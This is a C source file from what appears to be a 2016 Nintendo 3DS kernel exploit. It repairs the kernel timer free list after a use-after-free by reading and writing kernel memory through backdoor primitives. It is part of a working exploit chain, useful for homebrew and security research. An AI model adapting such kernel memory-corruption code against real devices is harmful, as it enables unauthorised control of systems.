/* cleanup.c Ned Williamson 2016 */

#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include <util.h>
#include "common.h"
#include "cleanup.h"
#include "backdoor.h"
#include "exploit.h"

/* is this valid across versions? */
#define KTIMER_OBJECT_SIZE 0x3C

/* This should really be IS_VTABLE but different mappings make it hard
 * to generalize this value. The only base pointers in the slab heap
 * are pointers to the vtable, pointers to kernel objects, and NULL,
 * so this overapproximation is worth the precision tradeoff.
 */
#define NUM_TIMER_OBJECTS ((u32)(table->ktimer_pool_size / KTIMER_OBJECT_SIZE))
#define KTIMER_BASE       ((void *)(0xFFF70000 + table->ktimer_base_offset))
#define KTIMER_END        ((void *)((u32)KTIMER_BASE + (NUM_TIMER_OBJECTS * KTIMER_OBJECT_SIZE)))

#define IS_KERNEL_NON_SLAB_HEAP(addr) (0xFFF00000 <= (u32)(addr) && (u32)(addr) < 0xFFF70000)
#define TOBJ_ADDR_TO_IDX(addr)        (((u32)(addr) - (u32)KTIMER_BASE) / KTIMER_OBJECT_SIZE)
#define TOBJ_IDX_TO_ADDR(idx)         ((u32)KTIMER_BASE + KTIMER_OBJECT_SIZE * (u32)(idx))

static void *find_orphan() {
  bool reachable[NUM_TIMER_OBJECTS];
  memset(reachable, 0, NUM_TIMER_OBJECTS * sizeof(bool));

  /* go through the timer table and find all reachable objects */
  u32 i = 0;
  for (void *current_timer = KTIMER_BASE;
       current_timer < KTIMER_END;
       current_timer += KTIMER_OBJECT_SIZE, i++) {
    void *child = (void *)kreadint(current_timer);

    if (IS_KERNEL_NON_SLAB_HEAP(child)) {
      /* object is allocated, therefore reachable */
      reachable[i] = true;
    } else if (KTIMER_BASE <= child && child < KTIMER_END) {
      /* object is freed, next pointer is reachable */
      reachable[TOBJ_ADDR_TO_IDX(child)] = true;
    } else if (child != NULL && child != (void *)TIMER2_NEXT_KERNEL) {
      printf("[!] Timer table entry had non-vtable, non-freed entry!\n");
      printf("It looks like this: %p -> %p\n", current_timer, child);
      wait_for_user();
    }
  }

  /* account for list head */
  void *first_freed = (void *)kreadint((void *)table->ktimer_pool_head);
  if (first_freed) {
    reachable[TOBJ_ADDR_TO_IDX(first_freed)] = true;
  }

  u32 num_unreachable = 0;
  void *orphan = NULL;
  for (i = 0; i < NUM_TIMER_OBJECTS; i++) {
    if (!reachable[i]) {
      num_unreachable++;
      /* update only if necessary */
      orphan = orphan ? orphan : (void *)TOBJ_IDX_TO_ADDR(i);
    }
  }
  if (num_unreachable != 1) {
    printf("[!] Warning: expected one unreachable node, found %ld!\n", num_unreachable);
  }

  return orphan;
}

static void **find_parent() {
  // traverse linked list until next points to userspace
  void *current_node = (void *)table->ktimer_pool_head;
  while (true) {
    void *next = (void *)kreadint(current_node);

    if (next == (void *)TIMER2_NEXT_KERNEL) {
      return current_node;
    } else if (next == NULL) {
      return NULL;
    }

    current_node = next;
  }
}

bool cleanup_uaf() {
  /* TODO: this entire function is TOCTTOU of kernel free list state */
  /* at this point the kernel timer free list contains a userspace item.
   * we need to fix that.
   */

  void **parent = find_parent();
  if (!parent) {
    printf("[-] Failed to find parent in KTimer linked list.\n");
    return false;
  }

  void *orphan = find_orphan();
  if (!orphan) {
    printf("[-] Failed to find orphan in KTimer linked list.\n");
    return false;
  }

  printf("[+] Fixed link: %p -> %p\n", parent, orphan);
  kwriteint((u32 *)parent, (u32)orphan);
  return true;
}
